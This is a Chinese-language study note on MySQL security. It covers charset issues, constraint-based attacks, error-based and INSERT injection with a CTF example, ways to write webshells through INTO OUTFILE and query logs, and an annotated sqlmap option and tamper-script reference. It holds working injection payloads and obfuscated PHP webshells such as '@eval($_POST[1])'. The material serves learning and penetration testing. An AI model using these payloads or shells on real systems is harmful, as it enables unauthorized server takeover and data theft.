# MySQL

## 编码

### utf8mb4

MySQL在5.5.3之后增加了utf8mb4的编码,专门用来兼容四字节的unicode字符,原来mysql支持的 utf8 编码最大字符长度为 3 字节，如果遇到 4 字节的宽字符就会插入异常了

### 字符集设置项

- character_set_server：默认的内部操作字符集
- character_set_client：客户端来源数据使用的字符集
- character_set_connection：连接层字符集
- character_set_results：查询结果字符集
- character_set_database：当前选中数据库的默认字符集
- character_set_system：系统元数据(字段名等)字符集

```sql
# 新建一个数据库指定字符集为utf8mb4
create database `web` character set `utf8mb4` collate `utf8mb4_general_ci`;

mysql> use web;
Database changed
mysql> SHOW VARIABLES WHERE Variable_name LIKE 'character\_set\_%' OR Variable_name LIKE 'collation%';  
+--------------------------+--------------------+
| Variable_name            | Value              |
+--------------------------+--------------------+
| character_set_client     | utf8mb4            |
| character_set_connection | utf8mb4            |
| character_set_database   | utf8mb4            |
| character_set_filesystem | binary             |
| character_set_results    | utf8mb4            |
| character_set_server     | latin1             |
| character_set_system     | utf8               |
| collation_connection     | utf8mb4_general_ci |
| collation_database       | utf8mb4_general_ci |
| collation_server         | latin1_swedish_ci  |
+--------------------------+--------------------+
10 rows in set (0.03 sec)
```

> 执行了set names utf8; 以后， character_set_client, character_set_connection, character_set_results 等与客户端相关的配置字符集都变成utf8

### 字符集转换过程

1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection

2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：

    - 使用每个数据字段的CHARACTER SET设定值

    - 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)

    - 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值

    - 若上述值不存在，则使用character_set_server设定值。

3. 将操作结果从内部操作字符集转换为character_set_results。

```sql
# 新建一张字符集为latin1的表
create table `charset_latin1` (
    `id` int unsigned not null auto_increment,
    `username` varchar(100) not null,
    `password` varchar(100) not null,
    primary key (`id`)
    ) charset=latin1 collate=latin1_general_ci;
```

这里客户端和服务端的字符编码不一致会导致安全问题:

- utf8=>latin1 client为utf8,服务端为latin1编码,此时可能会导致不完整字符丢失


<!-- ![path](https://nanazeven.github.io/image/sqlinbc.png) -->
<!-- ![path](../image/sqlinbc.png) -->

## 基于约束的SQL攻击

在SQL中执行字符串处理时，字符串末尾的空格符将会被删除,如下两条查询语句的查询结果相同:

```sql
select * from users where username='admin';
select * from users where username='admin   ';
```

问题的关键是如何将原有username加上空格作为新行插入表中,如下为常见的用户注册逻辑:

```php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT * FROM users WHERE username='$username'";
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) > 0) {
    // User exists, exit gracefully
  }
  else {
    // If not, only then insert a new entry
    $query = "INSERT INTO users(username, password) VALUES ('$username','$password')";
  }
```

在执行insert语句时,插入的值如果超出创建表的是定义的长度varchar(8),值会被裁剪至8位,如果后端在处理用户提交的数据是没有对username做长度验证,即提交一个9个字符的字符串`admin   1`即可绕过判断username已存在,并且在insert时将第九位1裁剪掉.


### mysql_real_escape_string() 

此函数转义 SQL 语句中使用的字符串中的特殊字符:

- \x00
- \n
- \r
- \
- '
- "
- \x1a

### htmlspecialchars()

实体化过滤:

- & (AND) => &amp;
- " (双引号) => &quot; (当ENT_NOQUOTES没有设置的时候) 
- ' (单引号) => &#039; (当ENT_QUOTES设置) 
- < (小于号) => &lt; 
- `>` (大于号) => &gt; 

### addslashes()函数 

会在以下关键词前面添加转义字符:

- 单引号（'）
- 双引号（"）
- 反斜杠（\）
- NULL

## order by

order by注入后续语句会使用报错、布尔、时间进行注入

接报错语句:

```sql
mysql> select * from charset_latin1 order by updatexml(1,concat('~',version()),1);
1105 - XPATH syntax error: '~5.6.45'
```

## insert update delete

报错语句:

```sql
//delete或update
insert into charset_latin1(`usernmae`,`password`) values('username' or updatexml(1,concat('~',version()),1),'password');

1105 - XPATH syntax error: '~5.6.45'
```

### 一个例子

题目地址:https://chall.tasteless.eu/level15/index.php

输入name和text插入数据库,在查询出来:

```sql
insert into table_name(name,text) values('','');
```

但是这里过滤了引号,不能通过闭合导致注入

可以利用这里的两个可控参数,name参数使用 `\` 转义 `'`,使得第一个参数位的引号和第二个参数位的引号闭合:

```sql
insert into table_name(name,text) values('\','(select something...))#');
```

当多个参数可控时,可以组合利用,挖掘XSS漏洞是也可以用到

## MySQL 反引号

连续的两个反引号被当作一个空格看待

## 盲注

### MySQL内置函数

- length()
- substring(string, start, length),mid(),substr()
- 函数ascii() 返回字符串str的最左字符的ascii编码,空=>0,NULL=>NULL
- ord() 函数返回字符串第一个字符的 ASCII 值
- exp(e) 是以e为底的指数函数


## MySql写shell 

### outfile和dumpfile

into outfile 可以导出多行数据,但是会在换行符后追加反斜杠,还会在最后添加换行符.所以不适合导出二进制文件
into dumpfile 只能导出一行数据可以使用limit限制查询数据,不会追加反斜杠和换行符

利用条件:
- 数据库当前用户是root
- 单引号没有被过滤
- web服务的绝对路径
- 绝对路径写入权限

union查询注入点:

```sql
?id=1 UNION ALL SELECT 1,'<?php phpinfo();?>',3 into outfile 'C:\phpinfo.php'%23
?id=1 UNION ALL SELECT 1,'<?php phpinfo();?>',3 into dumpfile 'C:\phpinfo.php'%23
```

其他情况

```sql
?id=1 into outfile 'C:\info.php' FIELDS TERMINATED BY '<?php phpinfo();?>'%23
```

`secure-file-friv`用于限制`info outfile`和`into dumpfile`的输出目录

当`secure-file-friv`的值为null时,表示mysql不允许导出文件,mysql `5.6.34`版本后默认值为null,且不支持sql语句动态修改

### 通过日志写shell

```sql
show variables like '%general%';
set global general_log = on;
set global general_log_file = '/var/www/html/1.php';
select '<?php phpinfo();?>';
select '<?php @eval($_POST[1]);?>';

```

php变形shell:

```php
<?php $sl = create_function('', @$_REQUEST['1']);$sl();?>
<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['1']));?>

```

慢查询日志,默认超过10秒的查询语句会被记录到慢查询日志:

```sql
how variables like '%slow_query_log%';
set global slow_query_log=1;
set global slow_query_log_file='C:\\phpStudy\\WWW\\1.php';
select '<?php @eval($_POST[1]);?>' or sleep(11);
```


## SQLMAP的使用

### options

-v 显示信息的级别，0-6：

- 0：只显示python错误和一些严重信息；
- 1：显示基本信息（默认）；
- 2：显示debug信息；
- 3：显示注入过程的payload；
- 4：显示http请求包；
- 5：显示http响应头；
- 6：显示http相应页面。

### target

以下至少需要设置其中一个选项，设置目标 URL

- -d 直接连目标后端接数据库，而不是通过sql注入漏洞，直接通过目标的侦听端口连接，当然需要有目标数据库的账号名和密码。例：-d "mysql://user:password@localhost:3389/database_name" --dbs 查询非常快。
- -u 指定一个url连接，url中必须有？a=aa才行（最常用的参数）例：-u "www.baidu.com/index.php?id=1"
- -l 后接一个log文件，可以是burp等的代理的log文件，之后sqlmap会扫描log中的所有记录。例： -l log.txt
- -x 站点地图，提交给sql一个xml文件。
- -m 后接一个txt文件，文件中是多个url，sqlmap会自动化的检测其中的所有url。例： -m target.txt
- -r 可以将一个post请求方式的数据包保存在一个txt中，sqlmap会通过post方式检测目标。例： -r post.txt
- -g 使用google引擎搜索类似的网址，并且多目标检测。例： -g "inurl:\".php?id=1\"" \是转义
- -c 将使用的命令写在一个文件中，让sqlmap执行文件中的命令，我们可以用--save命令将配置写入文件。

### request

这些选项可以用来指定如何连接到目标 URL

- --method=METHOD 指定是get方法还是post方法。例： --method=GET --method=POST
- --data=DATA 通过 POST 发送的数据字符串 例：-u "www.baidu.com/index.php" --data="name=1&pass=2"
- --param-del=PARA. 指明使用的变量分割符。例： -u "www.baidu.com/index.php" --data="name=1;pass=2" --param-del=";"
- --cookie=COOKIE 指定测试时使用的cookie，通常在一些需要登录的站点会使用。例： -u "www.baidu.com/index.php?id=1" --cookie="a=1;b=2"
- --cookie-del=COO.. 和前面的 --param-del=PARA. 类似，就是指明分割cookie的字符。
- --load-cookies=L.. 从包含Netscape / wget格式的cookie的文件中加载cookie。
- --drop-set-cookie 默认情况下，sqlmap是开启set-cookie功能的，也就是当收到一个含有set-cookie的http包的时候，下次sql会使用新的cookie进行发包，如果使用这条命令，就会关闭这个功能。在level>=2时会检测cookie注入。
- --user-agent=AGENT 指定一个user-agent的值进行测试。例： --user-agent="uaa" 默认情况下，sqlmap会使用自己的user-agent进行测试
- --random-agent 使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在sqlmap/txt/user-agent.txt 在level>=3时会检测user-agent注入。
- --host=HOST 指定http包中的host头参数。例： --host="xxx" 在level>=5时才会检查host头注入。\n是换行
- --referer=REFERER 指定http包中的refere字段。例： --refere="xxx" 在level>=3时才会检测refere注入。
- -H --headers 额外的header头，每个占一行。例：--headers="host:www.xxx.com\nUser-Agent:xxxx"
- --headers=HEADERS 跟上边一样，再举一个例子： --headers="Accept-Language: fr\nETag: 123" 注意所有构造http包的部分均区分大小写
- --auth-type=AUTH.. 基于http身份验证的种类。例： --auth-type Basic/Digest/NTLM 一共有三种认证方式。
- --auth-cred=AUTH.. 使用的认证，例： --auth-type Basic --auth-cred "user:password"
- --auth-file=AUTH.. 使用.PEM文件中的认证。例：--auth-file="AU.PEM" 少见。
- --ignore-code=IG.. 无视http状态码。例： --ignore-code=401
- --ignore-proxy 无视本地的代理，有时候机器会有最基本的代理配置，在扫描本地网段的时候会很麻烦，使用这个参数可以忽略代理设置。
- --ignore-redirects 无视http重定向，比如登录成功会跳转到其他网页，可使用这个忽略掉。
- --ignore-timeouts 忽略连接超时。
- --proxy=PROXY 指定一个代理。例： --proxy="127.0.0.1:8087" 使用GoAgent代理。
- --proxy-cred=PRO.. 代理需要的认证。例： --proxy="name:password"
- --proxy-file=PRO.. 从一个文件加载代理的认证。
- --tor 使用tor匿名网络，不懂。
- --tor-port=TORPORT 设置默认的tor代理端口，不懂+2。
- --tor-type=TORTYPE 设置tor代理种类，(HTTP, SOCKS4 or SOCKS5 (默认))，不懂+3。
- --check-tor 检查是否正确使用Tor，不懂+4。
- --delay=DELAY 每次发包的延迟时间，单位为秒，浮点数。例：--delay 2.5 有时候频繁的发包会引起服务器注意，需要使用delay降低发包频率。
- --timeout=TIMEOUT 请求超时的时间，单位为秒，浮点数，默认30s。
- --retries=RETRIES 超时重连次数，默认三次。例： --retries=5
- --randomize=RPARAM 参数的长度，类型与输入值保持一致的前提下，每次请求换参数的值。有时候反复的提交同一个参数会引起服务器注意。
- --safe-url=SAFEURL 用法和-u类似，就是一个加载测试url的方法，但额外功能是防止有时候时间长了不通讯服务器会销毁session，开启这种功能会隔一段时间发一个包保持session。
- --safe-post=SAFE.. 和上面的一样，只是使用post的方式发送数据。
- --safe-req=SAFER.. 和上面的一样，只是从一个文件获得目标。
- --safe-freq=SAFE.. 频繁的发送错误的请求，服务器也会销毁session或者其他惩罚方式，开启这个功能之后，发几次错的就会发一次对的。通常用于盲注。
- --skip-urlencode 跳过url编码，毕竟不排除有的奇葩网站url不遵守RFC标准编码。
- --csrf-token=CSR.. 保持csrf令牌的token。
- --csrf-url=CSRFURL 访问url地址获取csrf的token。
- --force-ssl 强制使用ssl。
- --hpp 使用http参数污染，通常http传递参数会以名称-值对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的，就可能造成参数篡改。
- --eval=EVALCODE 执行一段指定的python代码。例： -u "www.xx.com/index.php?id=1" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"

### Optimization（优化）

用于优化 sqlmap.py 的性能

- -o 开启下面三项（--predict-output，--keep-alive， --null-connection）
- --predict-output 预设的输出，可以理解为猜一个表存在不存在，根据服务器返回值来进行判断，有点类似暴力破解，但和暴力破解又不同，这个是一个范围性的暴力破解，一次一次的缩小范围。
- --keep-alive 使用http（s）长链接，性能更好，避免重复建立链接的开销，但占用服务器资源，而且与--proxy不兼容。
- --null-connection 只看页面返回的大小值，而不看具体内容，通常用于盲注或者布尔的判断，只看对错，不看内容。
- --threads=THREADS 开启多线程，默认为1，最大10。和 --predict-output 不兼容。

### Injection

用来指定测试哪些参数，提供自定义的注入 payloads 和可选篡改脚本

- -p TESTPARAMETER 知道测试的参数，使用这个的话--level 参数就会失效。例： -p "user-agent,refere"
- --skip=SKIP 排除指定的参数。例： --level 5 --skip="id,user-agent"
- --skip-static 跳过测试静态的参数。
- --param-exclude=.. 使用正则表达式跳过测试参数。
- --dbms=DBMS 指定目标数据库类型。例： --dbms="MySQL<5.0>" Oracle<11i> Microsoft SQL Server<2005>
- --dbms-cred=DBMS.. 数据库的认证。利： --dbms-cred="name:password"
- --os=OS 指定目标操作系统。例： --os="Linux/Windows"
- --invalid-bignum 通常情况下sqlmap使用负值使参数失效，比如id=1->id=-1,开启这个之后使用大值使参数失效，如id=9999999999。
- --invalid-logical 使用逻辑使参数失效，如id=1 and 1=2。
- --invalid-string 使用随机字符串使参数失效。
- --no-cast 获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。
- --no-escape 用于混淆和避免出错，使用单引号的字符串的时候，有时候会被拦截，sqlmap使用char()编码。例如：select “a”-> select char(97)。
- --prefix=PREFIX 指定payload前缀，有时候我们猜到了服务端代码的闭合情况，需要使用这个来指定一下。例： -u "www.abc.com/index?id=1" -p id --prefix")" --suffix "and ('abc'='abc"
- --suffix=SUFFIX 指定后缀，例子同上。
- --tamper=TAMPER 使用sqlmap自带的tamper，或者自己写的tamper，来混淆payload，通常用来绕过waf和ips。

- tamper 插件所在目录 \ sqlmap-dev\tamper
  - apostrophemask.py 用 UTF-8 全角字符替换单引号字符
  - apostrophenullencode.py 用非法双字节 unicode 字符替换单引号字符
  - appendnullbyte.py 在 payload 末尾添加空字符编码
  - base64encode.py 对给定的 payload 全部字符使用 Base64 编码
  - between.py 分别用 “NOT BETWEEN 0 AND #” 替换大于号 “>”，“BETWEEN # AND #” 替换等于号“=”
  - bluecoat.py 在 SQL 语句之后用有效的随机空白符替换空格符，随后用 “LIKE” 替换等于号“=”
  - chardoubleencode.py 对给定的 payload 全部字符使用双重 URL 编码（不处理已经编码的字符）
  - charencode.py 对给定的 payload 全部字符使用 URL 编码（不处理已经编码的字符）
  - charunicodeencode.py 对给定的 payload 的非编码字符使用 Unicode URL 编码（不处理已经编码的字符）
  - concat2concatws.py 用 “CONCAT_WS(MID(CHAR(0), 0, 0), A, B)” 替换像 “CONCAT(A, B)” 的实例
  - equaltolike.py 用 “LIKE” 运算符替换全部等于号“=”
  - greatest.py 用 “GREATEST” 函数替换大于号“>”
  - halfversionedmorekeywords.py 在每个关键字之前添加 MySQL 注释
  - ifnull2ifisnull.py 用 “IF(ISNULL(A), B, A)” 替换像 “IFNULL(A, B)” 的实例
  - lowercase.py 用小写值替换每个关键字字符
  - modsecurityversioned.py 用注释包围完整的查询
  - modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
  - multiplespaces.py 在 SQL 关键字周围添加多个空格
  - nonrecursivereplacement.py 用 representations 替换预定义 SQL 关键字，适用于过滤器
  - overlongutf8.py 转换给定的 payload 当中的所有字符
  - percentage.py 在每个字符之前添加一个百分号
  - randomcase.py 随机转换每个关键字字符的大小写
  - randomcomments.py 向 SQL 关键字中插入随机注释
  - securesphere.py 添加经过特殊构造的字符串
  - sp_password.py 向 payload 末尾添加 “sp_password” for automatic obfuscation from DBMS logs
  - space2comment.py 用 “/**/” 替换空格符
  - space2dash.py 用破折号注释符 “--” 其次是一个随机字符串和一个换行符替换空格符
  - space2hash.py 用磅注释符 “#” 其次是一个随机字符串和一个换行符替换空格符
  - space2morehash.py 用磅注释符 “#” 其次是一个随机字符串和一个换行符替换空格符
  - space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
  - space2mssqlhash.py 用磅注释符 “#” 其次是一个换行符替换空格符
  - space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
  - space2mysqldash.py 用破折号注释符 “--” 其次是一个换行符替换空格符
  - space2plus.py 用加号 “+” 替换空格符
  - space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
  - unionalltounion.py 用 “UNION SELECT” 替换“UNION ALL SELECT”
  - unmagicquotes.py 用一个多字节组合 %bf%27 和末尾通用注释一起替换空格符
  - varnish.py 添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF
  - versionedkeywords.py 用 MySQL 注释包围每个非函数关键字
  - versionedmorekeywords.py 用 MySQL 注释包围每个关键字
  - xforwardedfor.py 添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF
  
### Detection

这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容

在sqlmap/xml/payloads文件内可以看见各个level发送的payload

- --level=LEVEL 设置测试的等级（1-5，默认为1）
  - lv2：cookie; 
  - lv3：user-agent，refere; 
  - lv5：host 
- --risk=RISK 风险（1-4，默认1）升高风险等级会增加数据被篡改的风险。
  - risk 2：基于事件的测试;
  - risk 3：or语句的测试;
  - risk 4：update的测试
- --string=STRING 在基于布尔的注入时，有的时候返回的页面一次一个样，需要我们自己判断出标志着返回正确页面的标志，会根据页面的返回内容这个标志（字符串）判断真假，可以使用这个参数来制定看见什么字符串就是真。
- --not-string=NOT.. 同理，这个参数代表看不见什么才是真。
- --regexp=REGEXP 通常和上面两种连用，使用正则表达式来判断。
- --code=CODE 也是在基于布尔的注入时，只不过指定的是http返回码。
- --text-only 同上，只不过指定的是页面里的一段文本内容。
- --titles 同上，只不过指定的是页面的标题。

### Techniques

用于调整具体的 SQL 注入测试

- --technique=TECH 指定所使用的技术（B:布尔盲注;E:报错注入;U:联合查询注入;S:文件系统，操作系统，注册表相关注入;T:时间盲注; 默认全部使用）
- --time-sec=TIMESEC 在基于时间的盲注的时候，指定判断的时间，单位秒，默认5秒。
- --union-cols=UCOLS 联合查询的尝试列数，随level增加，最多支持50列。例： --union-cols 6-9
- --union-char=UCHAR 联合查询默认使用的占列的是null，有些情况null可能会失效，可以手动指定其他的。例： --union-char 1
- --union-from=UFROM 联合查询从之前的查询结果中选择列，和上面的类似。
- --dns-domain=DNS.. 如果你控制了一台dns服务器，使用这个可以提高效率。例： --dns-domain 123.com
- --second-order=S.. 在这个页面注入的结果，在另一个页面显示。例： --second-order 1.1.1.1/b.php

### Enumeration

用来列举后端数据库管理系统的信息、表中的结构和数据,可以运行额外的的 SQL 语句

- -a, --all 查找全部，很暴力。直接用-a
- -b, --banner 查找数据库管理系统的标识。直接用-b
- --current-user 当前用户，常用，直接用--current-user
- --current-db 当前数据库，常用，直接用--current-db
- --hostname 主机名，直接用--hostname
- --is-dba
- --users 查询一共都有哪些用户，常用，直接用--users
- --passwords 查询用户密码的哈希，常用，直接用--passwords
- --privileges 查看特权，常用。例： --privileges -U username (CU 就是当前用户)
- --roles 查看一共有哪些角色（权限），直接用--roles
- --dbs 目标服务器中有什么数据库，常用，直接用--dbs
- --tables 目标数据库有什么表，常用，直接用--tables
- --columns 目标表中有什么列，常用，直接用--colums
- --schema 目标数据库数据库系统管理模式。
- --count 查询结果返回一个数字，即多少个。
- --dump 查询指定范围的全部数据。例： --dump -D admin -T admin -C username
- --dump-all 查询全部数据。例： --dump-all --exclude-sysdbs
- --search 搜索列、表和/或数据库名称。
- --comments 检索数据库的备注。
- -D DB 指定从某个数据库查询数据，常用。例： -D admindb
- -T TBL 指定从某个表查询数据，常用。例： -T admintable
- -C COL 指定从某个列查询数据，常用。例： -C username
- -X EXCLUDE 指定数据库的标识符。
- -U USER 一个用户，通常和其他连用。例： --privileges -U username (CU 就是当前用户)
- --exclude-sysdbs 除了系统数据库。
- --pivot-column=P.. 枢轴列名，不懂。
- --where=DUMPWHERE 在dump表时使用where限制条件。
- --start=LIMITSTART 设置一个起始，通常和--dunmp连用。
- --stop=LIMITSTOP 同上，设置一个结束。
- --first=FIRSTCHAR 以第一个查询输出的字符检索，不懂。
- --last=LASTCHAR 以最后一个查询输出的字符检索，不懂+2。
- --sql-query=QUERY 执行一个sql语句。
- --sql-shell 创建一个sql的shell。
- --sql-file=SQLFILE 执行一个给定文件中的sql语句

### 理解sqlmap

测试环境:

- http://localhost/web/a.php?username=admin&password=admin
- username不存在注入点,password存在

测试步骤

1. 首先测试第一个参数username
2. 发送正常请求,查看链接是否正常
3. 新创建一个参数测试有无waf ips
4. 结合指定level等级,进行测试盲注,报错,内联查询,延时,union测试
5. 测试第二个参数passowrd